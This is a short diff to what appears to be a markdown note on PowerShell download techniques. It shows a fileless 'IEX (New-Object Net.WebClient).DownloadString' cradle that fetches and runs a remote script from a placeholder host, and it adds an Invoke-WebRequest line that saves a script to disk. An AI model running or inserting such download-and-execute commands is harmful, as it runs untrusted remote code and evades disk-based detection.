@@ -58,3 +58,6 @@ IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
 - No script file saved to disk
 
 #### Invoke-WebRequests
+```powershell
+Invoke-WebRequest https://example.com/script.ps1 -OutFile script.ps1
+```
